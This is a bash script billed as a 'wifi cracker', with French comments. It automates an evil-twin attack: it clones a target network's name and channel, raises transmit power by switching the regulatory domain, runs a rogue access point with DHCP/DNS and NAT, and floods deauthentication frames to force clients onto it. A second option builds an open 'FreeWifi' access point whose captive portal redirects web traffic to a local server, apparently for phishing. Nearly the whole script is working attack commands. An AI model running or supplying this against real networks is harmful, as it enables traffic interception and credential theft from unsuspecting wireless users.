#!/bin/bash

#-----------Log Files----------------------#
touch /tmp/log.txt
LOG_FILE=/tmp/log.txt
touch /tmp/LOG_HOSTAPD.txt
LOG_HOSTAPD=/tmp/LOG_HOSTAPD.TXT
touch /tmp/LOG_DNS.txt
LOG_DNS=/tmp/LOG_DNS.txt
touch /tmp/LOG_DNSPOOF.txt
SPOOF=/tmp/LOG_DNSPOOF.txt





#------------Variables------------------#
INTERFACE1=$(ifconfig |grep n0 |cut -d ":" -f1)
INTERFACE2=$(ifconfig |grep n1 |cut -d ":" -f1)

GATEWAY=10.0.0.1
MONITOR1=$(ifconfig |grep 0mon |cut -d ":" -f1)
MONITOR2=$(ifconfig |grep 1mon |cut -d ":" -f1)
jaune='\e[1;33m'
gris='\e[1;30m'

#CONFDIR=/root/fakeap

#airmon-ng start $INTERFACE1 &>> /dev/null


echo -e "$jaune Welcome to the wifi cracker , choose what you want to do : "

echo -e "\n"

echo -e "$gris 1)  Deauthentication Attack"
echo -e "$gris 2)  Create a wifi with captive portal"

echo -e "\n"

echo -e "$jaune Choose a option : "
read choice
  if [ $choice -eq 1 ]

then
airmon-ng check kill &>> /dev/null
airmon-ng check kill &>> /dev/null

airmon-ng start $INTERFACE2 &>> $LOG_FILE

MONITOR1=$(ifconfig |grep 0mon |cut -d ":" -f1)
MONITOR2=$(ifconfig |grep 1mon |cut -d ":" -f1)


echo "The first interface for monitor mode is -->"$MONITOR2
echo "The first interface for Deauth is -->"$INTERFACE1
sleep 2;

airodump-ng $INTERFACE1

echo "Choose the BSSID of the network to copy :"
read BSSID
echo "Enter the ESSID of the network :"
read ESSID
echo "Also the channel :"
read CHANNEL

echo "Your choose the network :"$ESSID","$BSSID","$CHANNEL "nice choice"

echo -e "\n"

ifconfig $MONITOR2 up $GATEWAY netmask 255.255.255.0

killall network-manager dnsmasq wpa_supplicant dhcpd &>> /dev/null

touch hostapd.conf
echo "
interface=$MONITOR2
driver=nl80211
ssid=$ESSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/fakeap/hostapd.conf

touch dnsmasq.conf
echo "
interface=$MONITOR2
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
" > /root/fakeap/dnsmasq.conf


#Modification  de la puissance du signal wifi de la carte : 

echo "Please wait the power of the wifi card increased"

iw reg set BZ
ip link set $MONITOR2 down
iw dev $MONITOR2 set txpower fixed 30mBm
ip link set $MONITOR2 up

iw reg set BZ
ip link set $INTERFACE1 down
iw dev $INTERFACE1 set txpower fixed 30mBm
ip link set $INTERFACE1 up

sleep 5;


echo -e "$jaune The power is now increased :)"

echo -e "\n"

echo -e "$gris The fake  access point starting"

hostapd /root/fakeap/hostapd.conf &
sleep 5;
dnsmasq -C /root/fakeap/dnsmasq.conf -d &

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan1mon -j ACCEPT

sleep 5;


echo "Deauth starting..."
xterm -hold -e "airodump-ng -c $CHANNEL $INTERFACE1" &
sleep 1;
xterm -hold -e "aireplay-ng -00 -a $BSSID $INTERFACE1" &

#------------------------------------------------------------------------------------------------------

elif [ $choice -eq 2 ]
     then


sudo apt update &>>/dev/null
sudo apt install hostapd dnsmasq apache2 -y &>>/dev/null

sudo killall network-manager wpa_supplicant dnsmasq &>>/dev/null

airmon-ng stop $MONITOR1 &>>/dev/null
airmon-ng check kill &>>/dev/null
airmon-ng check kill &>>/dev/null

airmon-ng start $INTERFACE1 &>>/dev/null

ifconfig $MONITOR1 up $GATEWAY netmask 255.255.255.0

echo "Apache2 and Mysql start..."
service apache2 start &>>/dev/null

echo "The fake access point starting ..."

touch hostapd.conf
echo "
interface=$MONITOR1
driver=nl80211
ssid=FreeWifi
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/captive/hostapd.conf

touch dnsmasq.conf
echo "
interface=$MONITOR1
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
" > /root/captive/dnsmasq.conf


hostapd /root/captive/hostapd.conf
sleep 3;
dnsmasq -C /root/captive/dnsmasq.conf -d

echo "Deleting iptables rules"
iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

echo "Setting new rules"
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
iptables -t nat -A POSTROUTING -j MASQUERADE

a2enmod rewrite &>>/dev/null
service apache2 reload &

sleep 2;

echo "Le captive portal devrait fonctionné mnt :)"
#dnsspoof -i $MONITOR1  &

fi

